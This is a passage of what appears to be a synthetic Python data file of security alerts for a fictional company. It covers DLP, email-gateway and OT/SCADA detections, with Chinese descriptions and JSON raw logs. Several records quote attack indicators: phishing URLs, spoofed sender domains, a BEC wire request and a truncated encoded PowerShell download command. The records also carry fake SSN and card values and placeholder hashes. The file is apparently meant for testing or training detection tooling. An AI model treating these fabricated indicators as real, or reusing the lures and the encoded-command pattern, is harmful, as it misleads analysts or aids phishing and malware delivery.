                "extracted_content_hash": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2",
                "classification_tags": ["PII", "SSN"]
            },
            "transfer_details": {
                "protocol": "MAPI",
                "recipient": "k.smith@mycorp.com",
                "subject": "Payroll Details"
            },
            "user_details": {"username": "j.doe", "domain": "MYCORP"},
            "device_details": {"hostname": "FIN-WKS-JDOE-05", "ip_address": "192.168.1.101"}
        }
    },
    {
        "source": "DLP",
        "rule_id": "DLP-Rule-13-Schema-Definition-Download",
        "rule_name": "敏感数据库架构下载",
        "alert_date": "2025-09-18T15:50:35Z",
        "tags": ["database-schema", "exfiltration"],
        "severity": "High",
        "reference": "用户c.jones从数据库下载敏感架构",
        "description": "用户 c.jones 从生产数据库中下载了包含敏感表结构和字段定义的数据库架构文件，这可能被用于未来的攻击或数据窃取。",
        "artifacts": [
            {"type": "username", "value": "c.jones"},
            {"type": "hostname", "value": "DBA-WKS-CJONES-07"},
            {"type": "ip", "value": "10.10.4.8"},
            {"type": "action", "value": "file-download"},
            {"type": "data_classification", "value": "Database Schema"},
            {"type": "file_name", "value": "prod_db_schema.sql"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-dba07",
            "timestamp": "2025-09-18T15:50:34.777Z",
            "event_type": "DataTransfer",
            "data_source": "MSSQL-Server",
            "data_destination": "Local File System",
            "file_details": {
                "file_path": "C:\\Users\\c.jones\\Downloads\\prod_db_schema.sql",
                "file_hash_sha256": "f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0d1e2f3c4b5a6f7e8d9c0b1a2",
                "classification_tags": ["Database-Schema", "Internal-Only"]
            },
            "transfer_details": {
                "application": "sqlclient.exe",
                "server_ip": "10.10.5.10"
            },
            "user_details": {"username": "c.jones", "domain": "MYCORP"},
            "device_details": {"hostname": "DBA-WKS-CJONES-07", "ip_address": "10.10.4.8"}
        }
    },
    {
        "source": "DLP",
        "rule_id": "DLP-Rule-14-Encrypted-File-Upload",
        "rule_name": "加密文件异常上传",
        "alert_date": "2025-09-18T15:55:12Z",
        "tags": ["encrypted-data", "exfiltration", "cloud-storage"],
        "severity": "High",
        "reference": "用户a.smith上传加密压缩包到云服务",
        "description": "检测到用户 a.smith 将一个加密的压缩文件（ZIP）上传到非授权的云服务。由于无法检查其内容，该行为被视为可疑，可能用于规避DLP检查。",
        "artifacts": [
            {"type": "username", "value": "a.smith"},
            {"type": "hostname", "value": "MKT-WKS-ASMITH-01"},
            {"type": "action", "value": "file-upload"},
            {"type": "file_name", "value": "project_data.zip.enc"},
            {"type": "destination_service", "value": "Google Drive"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-marketing01",
            "timestamp": "2025-09-18T15:55:11.901Z",
            "event_type": "DataTransfer",
            "data_source": "Local File System",
            "data_destination": "Cloud Storage",
            "file_details": {
                "file_path": "C:\\Users\\a.smith\\Desktop\\project_data.zip.enc",
                "file_hash_sha256": "c3e4d5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4",
                "classification_tags": ["Encrypted", "Uncategorized"]
            },
            "transfer_details": {
                "application": "GoogleDriveFS.exe",
                "file_size_mb": 150
            },
            "user_details": {"username": "a.smith", "domain": "MYCORP"},
            "device_details": {"hostname": "MKT-WKS-ASMITH-01", "ip_address": "192.168.2.54"}
        }
    },
    {
        "source": "DLP",
        "rule_id": "DLP-Rule-15-Credit-Card-Number-Clipboard",
        "rule_name": "信用卡号复制到剪贴板",
        "alert_date": "2025-09-18T16:00:25Z",
        "tags": ["pci", "credit-card", "clipboard"],
        "severity": "Low",
        "reference": "用户j.doe从浏览器复制信用卡信息",
        "description": "检测到用户 j.doe 从浏览器中复制了信用卡号码到剪贴板。虽然没有立即外发，但该行为存在潜在风险。",
        "artifacts": [
            {"type": "username", "value": "j.doe"},
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "action", "value": "clipboard-copy"},
            {"type": "data_classification", "value": "PCI"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-finance05",
            "timestamp": "2025-09-18T16:00:24.555Z",
            "event_type": "DataTransfer",
            "data_source": "Chrome Browser",
            "data_destination": "Clipboard",
            "data_details": {
                "extracted_content_hash": "d1e2f3c4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0d1c2b3a4f5e6d7c8b9a0f1e2",
                "classification_tags": ["Credit Card", "PCI"]
            },
            "transfer_details": {
                "application": "chrome.exe",
                "source_url": "https://internal.payment.portal.com"
            },
            "user_details": {"username": "j.doe", "domain": "MYCORP"},
            "device_details": {"hostname": "FIN-WKS-JDOE-05", "ip_address": "192.168.1.101"}
        }
    },
    {
        "source": "DLP",
        "rule_id": "DLP-Rule-16-CAD-Drawing-Print",
        "rule_name": "技术图纸打印",
        "alert_date": "2025-09-18T16:05:00Z",
        "tags": ["intellectual-property", "cad", "print"],
        "severity": "High",
        "reference": "研发部员工d.chen打印工程图纸",
        "description": "检测到用户 d.chen 将包含公司知识产权的技术图纸（CAD）打印到非指定的打印机。",
        "artifacts": [
            {"type": "username", "value": "d.chen"},
            {"type": "hostname", "value": "DEV-WKS-DCHEN-12"},
            {"type": "action", "value": "print"},
            {"type": "data_classification", "value": "Intellectual Property"},
            {"type": "file_name", "value": "New_Product_Design_V2.dwg"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-dev12",
            "timestamp": "2025-09-18T16:04:59.666Z",
            "event_type": "DataTransfer",
            "data_source": "Local File System",
            "data_destination": "Printer",
            "file_details": {
                "file_path": "C:\\Users\\d.chen\\Documents\\CAD\\New_Product_Design_V2.dwg",
                "file_hash_sha256": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2",
                "classification_tags": ["CAD", "Design", "Proprietary"]
            },
            "transfer_details": {
                "printer_name": "\\\\CORP-PRN-05\\HR-Printer"
            },
            "user_details": {"username": "d.chen", "domain": "MYCORP"},
            "device_details": {"hostname": "DEV-WKS-DCHEN-12", "ip_address": "10.10.3.25"}
        }
    },
    {
        "source": "DLP",
        "rule_id": "DLP-Rule-17-Sensitive-Data-in-Email-Subject",
        "rule_name": "邮件主题中包含敏感信息",
        "alert_date": "2025-09-18T16:10:15Z",
        "tags": ["pii", "email"],
        "severity": "Low",
        "reference": "用户j.doe在邮件主题中包含SSN",
        "description": "用户 j.doe 发送的内部电子邮件主题中包含了敏感的社会安全号码（SSN）。",
        "artifacts": [
            {"type": "username", "value": "j.doe"},
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "action", "value": "internal-email"},
            {"type": "data_classification", "value": "PII-SSN"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-finance05",
            "timestamp": "2025-09-18T16:10:14.333Z",
            "event_type": "DataTransfer",
            "data_source": "Outlook",
            "data_destination": "Internal Email",
            "transfer_details": {
                "protocol": "MAPI",
                "subject": "工资核算 - 员工 SSN: 123-45-6789",
                "recipient": "k.smith@mycorp.com"
            },
            "data_match": {
                "pattern": "Social Security Number",
                "field": "subject"
            },
            "user_details": {"username": "j.doe", "domain": "MYCORP"},
            "device_details": {"hostname": "FIN-WKS-JDOE-05", "ip_address": "192.168.1.101"}
        }
    },
    {
        "source": "DLP",
        "rule_id": "DLP-Rule-18-Unauthorized-Database-Query-Result",
        "rule_name": "未经授权的数据库查询结果",
        "alert_date": "2025-09-18T16:15:30Z",
        "tags": ["database-query", "pii", "exfiltration"],
        "severity": "High",
        "reference": "用户c.jones执行大规模客户数据查询",
        "description": "用户 c.jones 执行了返回大量客户数据的数据库查询，并将结果导出。该查询涉及敏感字段，超出了其正常工作权限。",
        "artifacts": [
            {"type": "username", "value": "c.jones"},
            {"type": "hostname", "value": "DBA-WKS-CJONES-07"},
            {"type": "action", "value": "database-query-export"},
            {"type": "data_classification", "value": "PII-Customer"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-dba07",
            "timestamp": "2025-09-18T16:15:29.876Z",
            "event_type": "DataTransfer",
            "data_source": "MSSQL-Server",
            "data_destination": "Local File System",
            "transfer_details": {
                "application": "sqlclient.exe",
                "query": "SELECT * FROM Customers.PersonalDetails",
                "rows_exported": 50000
            },
            "data_match": {
                "pattern": "PII-Customer",
                "match_count": 50000
            },
            "user_details": {"username": "c.jones", "domain": "MYCORP"},
            "device_details": {"hostname": "DBA-WKS-CJONES-07", "ip_address": "10.10.4.8"}
        }
    }, {
        "source": "DLP",
        "rule_id": "DLP-Rule-03-Confidential-Document-Exfiltration",
        "rule_name": "机密文件外泄",
        "alert_date": "2025-09-18T15:05:30Z",
        "tags": ["confidential-data", "exfiltration", "email"],
        "severity": "High",
        "reference": "用户j.doe通过个人邮箱外发项目计划书",
        "description": "检测到用户 j.doe 试图通过其个人邮箱（johndoe.private@gmail.com）发送包含“2025年战略项目计划书”的文件。该文件被DLP系统标记为机密。",
        "artifacts": [
            {"type": "username", "value": "j.doe"},
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "ip", "value": "192.168.1.101"},
            {"type": "action", "value": "email-send"},
            {"type": "data_classification", "value": "Confidential"},
            {"type": "file_name", "value": "2025_Strategic_Plan.docx"},
            {"type": "destination_email", "value": "johndoe.private@gmail.com"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-finance05",
            "timestamp": "2025-09-18T15:05:29.876Z",
            "event_type": "DataTransfer",
            "data_source": "Outlook",
            "data_destination": "External Email",
            "file_details": {
                "file_path": "C:\\Users\\j.doe\\Documents\\Projects\\2025_Strategic_Plan.docx",
                "file_hash_sha256": "f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4",
                "classification_tags": ["Confidential", "Project-Chimera"]
            },
            "transfer_details": {
                "protocol": "SMTP",
                "recipient": "johndoe.private@gmail.com",
                "subject": "FYI - 2025 Plan"
            },
            "user_details": {"username": "j.doe", "domain": "MYCORP"},
            "device_details": {"hostname": "FIN-WKS-JDOE-05", "ip_address": "192.168.1.101"}
        }
    },
    {
        "source": "DLP",
        "rule_id": "DLP-Rule-05-PII-Upload-to-Cloud",
        "rule_name": "敏感个人信息上传到非授权云服务",
        "alert_date": "2025-09-18T15:15:10Z",
        "tags": ["pii", "cloud-storage", "exfiltration"],
        "severity": "Medium",
        "reference": "市场部员工a.smith向Dropbox上传客户列表",
        "description": "用户 a.smith 将一个包含大量客户个人身份信息（PII）的电子表格上传到非授权的云存储服务 Dropbox。该行为违反了公司的数据处理政策。",
        "artifacts": [
            {"type": "username", "value": "a.smith"},
            {"type": "hostname", "value": "MKT-WKS-ASMITH-01"},
            {"type": "ip", "value": "192.168.2.54"},
            {"type": "action", "value": "file-upload"},
            {"type": "data_classification", "value": "PII"},
            {"type": "file_name", "value": "Q3_Customer_Leads.xlsx"},
            {"type": "destination_service", "value": "Dropbox"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-marketing01",
            "timestamp": "2025-09-18T15:15:09.521Z",
            "event_type": "DataTransfer",
            "data_source": "Local File System",
            "data_destination": "Cloud Storage",
            "file_details": {
                "file_path": "C:\\Users\\a.smith\\Documents\\Q3_Customer_Leads.xlsx",
                "file_hash_sha256": "b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2",
                "classification_tags": ["PII", "Customers"]
            },
            "transfer_details": {
                "application": "Dropbox.exe",
                "url": "https://api.dropbox.com/content/upload"
            },
            "user_details": {"username": "a.smith", "domain": "MYCORP"},
            "device_details": {"hostname": "MKT-WKS-ASMITH-01", "ip_address": "192.168.2.54"}
        }
    },
    {
        "source": "DLP",
        "rule_id": "DLP-Rule-07-Internal-Credit-Card-Number-Transfer",
        "rule_name": "内部信用卡号码传输",
        "alert_date": "2025-09-18T15:20:45Z",
        "tags": ["pci", "credit-card", "chat-application"],
        "severity": "Low",
        "reference": "用户j.doe在内部聊天中发送敏感信息",
        "description": "用户 j.doe 在内部即时通讯工具中发送了疑似信用卡号码的字符串。尽管是内部通信，但该行为仍违反了 PCI DSS（支付卡行业数据安全标准）规定。",
        "artifacts": [
            {"type": "username", "value": "j.doe"},
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "action", "value": "chat-message"},
            {"type": "data_classification", "value": "PCI"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-finance05",
            "timestamp": "2025-09-18T15:20:44.912Z",
            "event_type": "DataTransfer",
            "data_source": "Chat Application",
            "data_destination": "Internal Chat",
            "transfer_details": {
                "application": "Teams.exe",
                "message_text": "订单号 456789，付款失败，用这张卡试试 4123-4567-8901-2345"
            },
            "data_match": {
                "pattern": "Credit Card Number",
                "value_redacted": "4123-XXXX-XXXX-2345"
            },
            "user_details": {"username": "j.doe", "domain": "MYCORP"},
            "device_details": {"hostname": "FIN-WKS-JDOE-05", "ip_address": "192.168.1.101"}
        }
    }
]
mail_alert = [
    {
        "source": "Email Security",
        "rule_id": "ES-Rule-01-Phishing-URL-Detected",
        "rule_name": "邮件中检测到钓鱼URL",
        "alert_date": "2025-09-18T16:20:10Z",
        "tags": ["phishing", "url-threat"],
        "severity": "High",
        "reference": "用户j.doe收到含有恶意URL的钓鱼邮件",
        "description": "用户 j.doe 收到一封伪装成银行通知的邮件，其中包含一个指向已知钓鱼网站的恶意链接。",
        "artifacts": [
            {"type": "recipient_email", "value": "j.doe@mycorp.com"},
            {"type": "sender_email", "value": "noreply@mybank-secure.net"},
            {"type": "subject", "value": "您的账户已被暂停，请立即验证"},
            {"type": "url", "value": "http://mybank-login-secure.com/verify?id=1a2b3c4d"},
            {"type": "threat_type", "value": "Phishing"}
        ],
        "raw_log": {
            "gateway_id": "email-gw-01",
            "timestamp": "2025-09-18T16:20:09.543Z",
            "event_type": "URLScan",
            "detection_details": {
                "url": "http://mybank-login-secure.com/verify?id=1a2b3c4d",
                "verdict": "Malicious",
                "reason": "Threat intelligence match",
                "threat_name": "Fake Bank Login Page"
            },
            "email_details": {
                "sender": "noreply@mybank-secure.net",
                "recipient": "j.doe@mycorp.com",
                "subject": "您的账户已被暂停，请立即验证"
            }
        }
    },
    {
        "source": "Email Security",
        "rule_id": "ES-Rule-02-Malicious-Attachment-Detected",
        "rule_name": "邮件中检测到恶意附件",
        "alert_date": "2025-09-18T16:25:35Z",
        "tags": ["malware", "attachment", "ransomware"],
        "severity": "Critical",
        "reference": "用户a.smith收到含有恶意宏文档的邮件",
        "description": "一封发给用户 a.smith 的邮件附件中包含一个被沙箱分析为恶意软件（Ransomware）的 Word 文档。该文档试图执行恶意宏。",
        "artifacts": [
            {"type": "recipient_email", "value": "a.smith@mycorp.com"},
            {"type": "sender_email", "value": "invoice@supplier-online.co.kr"},
            {"type": "subject", "value": "重要：发票#20250918"},
            {"type": "file_name", "value": "Invoice-20250918.docm"},
            {"type": "file_hash_sha256", "value": "a9b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1"},
            {"type": "threat_type", "value": "Ransomware"}
        ],
        "raw_log": {
            "gateway_id": "email-gw-02",
            "timestamp": "2025-09-18T16:25:34.888Z",
            "event_type": "AttachmentScan",
            "detection_details": {
                "file_name": "Invoice-20250918.docm",
                "file_hash_sha256": "a9b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1",
                "verdict": "Malicious",
                "reason": "Sandbox analysis (macro execution)",
                "threat_name": "Qbot"
            },
            "email_details": {
                "sender": "invoice@supplier-online.co.kr",
                "recipient": "a.smith@mycorp.com",
                "subject": "重要：发票#20250918"
            }
        }
    },
    {
        "source": "Email Security",
        "rule_id": "ES-Rule-03-BEC-Spoofing-CEO",
        "rule_name": "商业邮件欺诈（BEC）- 冒充CEO",
        "alert_date": "2025-09-18T16:30:40Z",
        "tags": ["bec", "spoofing", "financial-fraud"],
        "severity": "High",
        "reference": "假冒CEO的邮件要求紧急转账",
        "description": "一封伪装成公司CEO（j.smith@mycorp.com）的邮件，要求财务部员工 j.doe 紧急执行一笔电汇。发件人显示名称与CEO一致，但发件人邮箱地址为外部域名。",
        "artifacts": [
            {"type": "recipient_email", "value": "j.doe@mycorp.com"},
            {"type": "sender_display_name", "value": "John Smith"},
            {"type": "sender_email", "value": "john.smith.ceo@outlook.com"},
            {"type": "subject", "value": "紧急电汇请求"},
            {"type": "threat_type", "value": "BEC"}
        ],
        "raw_log": {
            "gateway_id": "email-gw-03",
            "timestamp": "2025-09-18T16:30:39.901Z",
            "event_type": "BECDetection",
            "detection_details": {
                "spoofed_user": "j.smith@mycorp.com",
                "sender_email": "john.smith.ceo@outlook.com",
                "reason": "Sender domain mismatch, display name impersonation, urgency keywords detected."
            },
            "email_details": {
                "sender": "john.smith.ceo@outlook.com",
                "recipient": "j.doe@mycorp.com",
                "subject": "紧急电汇请求"
            }
        }
    },
    {
        "source": "Email Security",
        "rule_id": "ES-Rule-04-Credential-Phishing-Page",
        "rule_name": "凭据钓鱼页面链接",
        "alert_date": "2025-09-18T16:35:15Z",
        "tags": ["phishing", "credential-harvesting", "url-threat"],
        "severity": "High",
        "reference": "用户d.chen收到钓鱼邮件，链接到假冒的Office登录页面",
        "description": "用户 d.chen 收到一封声称“您的Office 365密码即将过期”的邮件，邮件中的链接指向一个模仿公司登录页面的钓鱼网站。",
        "artifacts": [
            {"type": "recipient_email", "value": "d.chen@mycorp.com"},
            {"type": "sender_email", "value": "admin@microsoft.co.us"},
            {"type": "subject", "value": "立即更新您的密码以避免账户锁定"},
            {"type": "url", "value": "https://office365-mycorp-login.net/signin"}
        ],
        "raw_log": {
            "gateway_id": "email-gw-01",
            "timestamp": "2025-09-18T16:35:14.678Z",
            "event_type": "URLScan",
            "detection_details": {
                "url": "https://office365-mycorp-login.net/signin",
                "verdict": "Malicious",
                "reason": "URL impersonation pattern, known phishing site"
            },
            "email_details": {
                "sender": "admin@microsoft.co.us",
                "recipient": "d.chen@mycorp.com",
                "subject": "立即更新您的密码以避免账户锁定"
            }
        }
    },
    {
        "source": "Email Security",
        "rule_id": "ES-Rule-05-Fileless-Malware-Detected",
        "rule_name": "邮件中检测到无文件恶意软件",
        "alert_date": "2025-09-18T16:40:50Z",
        "tags": ["malware", "fileless", "powershell"],
        "severity": "High",
        "reference": "用户h.lin收到含有可疑PowerShell命令的邮件",
        "description": "用户 h.lin 收到一封邮件，邮件正文或附件中包含经过混淆的 PowerShell 命令，旨在下载并执行恶意载荷，不依赖于传统文件附件。",
        "artifacts": [
            {"type": "recipient_email", "value": "h.lin@mycorp.com"},
            {"type": "sender_email", "value": "updates@newsletters.xyz"},
            {"type": "subject", "value": "最新公司新闻"},
            {"type": "command_line_snippet", "value": "powershell.exe -enc VwByAGkAdABlAC0ASABv..."},
            {"type": "threat_type", "value": "Fileless Malware"}
        ],
        "raw_log": {
            "gateway_id": "email-gw-02",
            "timestamp": "2025-09-18T16:40:49.123Z",
            "event_type": "ContentScan",
            "detection_details": {
                "detection_method": "Signature/Behavioral",
                "reason": "Detected obfuscated PowerShell command in email body"
            },
            "email_details": {
                "sender": "updates@newsletters.xyz",
                "recipient": "h.lin@mycorp.com",
                "subject": "最新公司新闻"
            }
        }
    },
    {
        "source": "Email Security",
        "rule_id": "ES-Rule-06-Suspicious-Login-Attempt-Notification",
        "rule_name": "可疑登录尝试钓鱼邮件",
        "alert_date": "2025-09-18T16:45:22Z",
        "tags": ["phishing", "social-engineering"],
        "severity": "Medium",
        "reference": "用户m.li收到可疑登录通知邮件",
        "description": "一封发给用户 m.li 的邮件声称有“来自未知设备的登录尝试”，并要求用户点击链接“立即保护您的账户”。该邮件来自非官方来源。",
        "artifacts": [
            {"type": "recipient_email", "value": "m.li@mycorp.com"},
            {"type": "sender_email", "value": "security-alert@service.online-secure.ru"},
            {"type": "subject", "value": "警告：来自新设备的登录！"},
            {"type": "threat_type", "value": "Phishing"}
        ],
        "raw_log": {
            "gateway_id": "email-gw-03",
            "timestamp": "2025-09-18T16:45:21.567Z",
            "event_type": "PhishingAttempt",
            "detection_details": {
                "reason": "Social engineering keywords, non-corporate sender, urgency in subject"
            },
            "email_details": {
                "sender": "security-alert@service.online-secure.ru",
                "recipient": "m.li@mycorp.com",
                "subject": "警告：来自新设备的登录！"
            }
        }
    },
    {
        "source": "Email Security",
        "rule_id": "ES-Rule-07-Domain-Spoofing-HR-Team",
        "rule_name": "邮件域名仿冒 - HR团队",
        "alert_date": "2025-09-18T16:50:05Z",
        "tags": ["spoofing", "credential-harvesting"],
        "severity": "Medium",
        "reference": "假冒HR团队的邮件发送给全体员工",
        "description": "一封伪装成 HR 团队（hr@mycorp.com）的邮件，其发件人地址使用了高度相似的域名（hr@mycorps.com），邮件要求员工更新个人信息。",
        "artifacts": [
            {"type": "recipient_email", "value": "all@mycorp.com"},
            {"type": "sender_email", "value": "hr@mycorps.com"},
            {"type": "subject", "value": "请更新您的员工信息以获取最新福利"},
            {"type": "spoofed_domain", "value": "mycorp.com"},
            {"type": "threat_type", "value": "Domain Spoofing"}
        ],
        "raw_log": {
            "gateway_id": "email-gw-01",
            "timestamp": "2025-09-18T16:50:04.990Z",
            "event_type": "SpoofingDetection",
            "detection_details": {
                "reason": "DMARC/SPF/DKIM failed, domain similarity detected",
                "spoofed_domain": "mycorp.com",
                "sender_domain": "mycorps.com"
            },
            "email_details": {
                "sender": "hr@mycorps.com",
                "recipient": "all@mycorp.com",
                "subject": "请更新您的员工信息以获取最新福利"
            }
        }
    },
    {
        "source": "Email Security",
        "rule_id": "ES-Rule-08-Suspicious-Archive-Attachment",
        "rule_name": "可疑的压缩附件",
        "alert_date": "2025-09-18T16:55:18Z",
        "tags": ["malware", "attachment", "archive"],
        "severity": "Medium",
        "reference": "用户c.jones收到密码保护的压缩附件",
        "description": "一封发给用户 c.jones 的邮件附件中包含一个密码保护的 ZIP 文件，邮件正文提供了密码。这种技术常用于规避安全扫描。",
        "artifacts": [
            {"type": "recipient_email", "value": "c.jones@mycorp.com"},
            {"type": "sender_email", "value": "support@data-service.ru"},
            {"type": "subject", "value": "数据请求回复"},
            {"type": "file_name", "value": "report.zip"}
        ],
        "raw_log": {
            "gateway_id": "email-gw-02",
            "timestamp": "2025-09-18T16:55:17.345Z",
            "event_type": "AttachmentScan",
            "detection_details": {
                "file_name": "report.zip",
                "verdict": "Suspicious",
                "reason": "Password-protected archive, password provided in body"
            },
            "email_details": {
                "sender": "support@data-service.ru",
                "recipient": "c.jones@mycorp.com",
                "subject": "数据请求回复"
            }
        }
    },
    {
        "source": "Email Security",
        "rule_id": "ES-Rule-09-Internal-Account-Compromise",
        "rule_name": "内部账户被盗用发送垃圾邮件",
        "alert_date": "2025-09-18T17:00:00Z",
        "tags": ["compromised-account", "spam"],
        "severity": "High",
        "reference": "被盗用的内部账户j.doe发送大量垃圾邮件",
        "description": "内部账户 j.doe@mycorp.com 发送了大量包含垃圾内容的邮件。该账户可能已被攻击者接管，用于传播恶意信息。",
        "artifacts": [
            {"type": "sender_email", "value": "j.doe@mycorp.com"},
            {"type": "source_ip", "value": "8.8.8.8"},
            {"type": "subject", "value": "赚取丰厚利润的秘诀"},
            {"type": "threat_type", "value": "Spam/Account Compromise"}
        ],
        "raw_log": {
            "gateway_id": "email-gw-03",
            "timestamp": "2025-09-18T16:59:59.000Z",
            "event_type": "SpamDetection",
            "detection_details": {
                "reason": "High volume of spam messages, source IP mismatch with corporate network"
            },
            "email_details": {
                "sender": "j.doe@mycorp.com",
                "recipient": "various-external-recipients",
                "subject": "赚取丰厚利润的秘诀"
            }
        }
    },
    {
        "source": "Email Security",
        "rule_id": "ES-Rule-10-Payload-Delivery-through-Image",
        "rule_name": "邮件图片中隐藏恶意载荷",
        "alert_date": "2025-09-18T17:05:30Z",
        "tags": ["steganography", "malware"],
        "severity": "High",
        "reference": "用户a.smith收到含有隐写恶意代码的图片",
        "description": "一封发给用户 a.smith 的邮件附件中包含一张图片（JPG），但经深度内容分析，发现其中使用了隐写术隐藏了恶意代码。",
        "artifacts": [
            {"type": "recipient_email", "value": "a.smith@mycorp.com"},
            {"type": "sender_email", "value": "photo-share@online-gallery.biz"},
            {"type": "subject", "value": "您有一张新照片需要查看"},
            {"type": "file_name", "value": "photo.jpg"},
            {"type": "threat_type", "value": "Steganography"}
        ],
        "raw_log": {
            "gateway_id": "email-gw-01",
            "timestamp": "2025-09-18T17:05:29.876Z",
            "event_type": "AttachmentScan",
            "detection_details": {
                "file_name": "photo.jpg",
                "verdict": "Malicious",
                "reason": "Steganography detection, hidden code payload found"
            },
            "email_details": {
                "sender": "photo-share@online-gallery.biz",
                "recipient": "a.smith@mycorp.com",
                "subject": "您有一张新照片需要查看"
            }
        }
    }
]

ot_alert = [
    {
        "source": "OT",
        "rule_id": "OT-Rule-01-PLC-Configuration-Change",
        "rule_name": "PLC配置未经授权修改",
        "alert_date": "2025-09-18T17:10:00Z",
        "tags": ["plc", "unauthorized-change", "firmware"],
        "severity": "Critical",
        "reference": "生产线PLC01上发生未授权的配置修改",
        "description": "检测到生产线 PLC-PROD-01 的固件或配置发生未经授权的修改。此行为可能导致生产过程中断或安全风险。",
        "artifacts": [
            {"type": "device_id", "value": "PLC-PROD-01"},
            {"type": "ip", "value": "10.1.1.10"},
            {"type": "protocol", "value": "S7Comm"},
            {"type": "change_type", "value": "PLC-Firmware-Update"}
        ],
        "raw_log": {
            "sensor_id": "ot-sensor-line01",
            "timestamp": "2025-09-18T17:09:59.321Z",
            "event_type": "DeviceConfigurationChange",
            "device_details": {"device_id": "PLC-PROD-01", "ip_address": "10.1.1.10", "vendor": "Siemens"},
            "change_details": {"type": "firmware-update", "status": "succeeded", "source_ip": "10.1.2.55", "user": "system"}
        }
    },
    {
        "source": "OT",
        "rule_id": "OT-Rule-02-Unusual-Protocol-Activity",
        "rule_name": "SCADA网络中可疑协议活动",
        "alert_date": "2025-09-18T17:15:30Z",
        "tags": ["protocol", "network-anomaly", "scada"],
        "severity": "Medium",
        "reference": "SCADA网络中出现异常的RDP连接",
        "description": "SCADA 网络段中，主机 SCADA-HMI-05 发起了到未知主机的 RDP 连接。该协议通常不用于生产网络中的 SCADA 通信。",
        "artifacts": [
            {"type": "source_device", "value": "SCADA-HMI-05"},
            {"type": "source_ip", "value": "10.1.1.20"},
            {"type": "destination_ip", "value": "10.1.50.123"},
            {"type": "protocol", "value": "RDP", "port": 3389}
        ],
        "raw_log": {
            "sensor_id": "ot-sensor-line02",
            "timestamp": "2025-09-18T17:15:29.876Z",
            "event_type": "NetworkFlow",
            "flow_details": {
                "source_ip": "10.1.1.20",
                "destination_ip": "10.1.50.123",
                "destination_port": 3389,
                "protocol": "TCP"
            },
            "network_context": {"segment": "SCADA-Network-Zone", "reason": "Unusual protocol for this segment"}
        }
    },
    {
        "source": "OT",
        "rule_id": "OT-Rule-03-Controller-Stop-Command",
        "rule_name": "控制器收到停止命令",
        "alert_date": "2025-09-18T17:20:10Z",
        "tags": ["controller", "process-interruption", "stop-command"],
        "severity": "Critical",
        "reference": "控制器ROB-ARM-03收到停止命令",
        "description": "生产机器人控制器 ROB-ARM-03 收到一个停止命令。该命令未在正常操作时间范围内或来自非授权源。",
        "artifacts": [
            {"type": "device_id", "value": "ROB-ARM-03"},
            {"type": "ip", "value": "10.1.1.30"},
            {"type": "command", "value": "stop"}
        ],
        "raw_log": {
            "sensor_id": "ot-sensor-line01",
            "timestamp": "2025-09-18T17:20:09.555Z",
            "event_type": "ControlCommand",
            "device_details": {"device_id": "ROB-ARM-03", "ip_address": "10.1.1.30"},
            "command_details": {"action": "stop-command", "source_ip": "10.1.1.20"}
        }
    },
    {
        "source": "OT",
        "rule_id": "OT-Rule-04-Unauthorized-External-Access",
        "rule_name": "生产网络未经授权的外部访问",
        "alert_date": "2025-09-18T17:25:45Z",
        "tags": ["external-access", "remote-access", "vpn"],
        "severity": "Critical",
        "reference": "来自外部IP的未经授权访问",
        "description": "检测到来自公司外部 IP 地址 203.0.113.10 的远程访问尝试，目标是生产网络中的主机，此访问未通过常规的 VPN 渠道。",
        "artifacts": [
            {"type": "source_ip", "value": "203.0.113.10"},
            {"type": "destination_ip", "value": "10.1.1.50"},
            {"type": "protocol", "value": "TCP", "port": 22},
            {"type": "service", "value": "SSH"}
        ],
        "raw_log": {
            "sensor_id": "ot-firewall-01",
            "timestamp": "2025-09-18T17:25:44.912Z",
            "event_type": "TrafficBlock",
            "traffic_details": {
                "source_ip": "203.0.113.10",
                "destination_ip": "10.1.1.50",
                "destination_port": 22,
                "protocol": "TCP"
            },
            "security_context": {"reason": "Unauthorized external IP access to OT segment"}
        }
    },
    {
        "source": "OT",
        "rule_id": "OT-Rule-05-High-Frequency-HMI-Commands",
        "rule_name": "HMI高频操作命令",
        "alert_date": "2025-09-18T17:30:20Z",
        "tags": ["hmi", "command-spam", "anomaly"],
        "severity": "Medium",
        "reference": "HMI-CTRL-02发出异常高频的命令",
        "description": "人机界面 HMI-CTRL-02 在短时间内向多个控制器发出异常高频的操作命令。这可能是恶意脚本或自动化攻击的迹象。",
        "artifacts": [
            {"type": "device_id", "value": "HMI-CTRL-02"},
            {"type": "ip", "value": "10.1.1.45"},
            {"type": "command_rate", "value": "20 commands/sec"}
        ],
        "raw_log": {
            "sensor_id": "ot-sensor-line03",
            "timestamp": "2025-09-18T17:30:19.444Z",
            "event_type": "ControlCommandRateAnomaly",
            "device_details": {"device_id": "HMI-CTRL-02", "ip_address": "10.1.1.45"},
            "anomaly_details": {"command_count": 120, "time_window_sec": 6, "reason": "High frequency of write commands"}
        }
    },
    {
        "source": "OT",
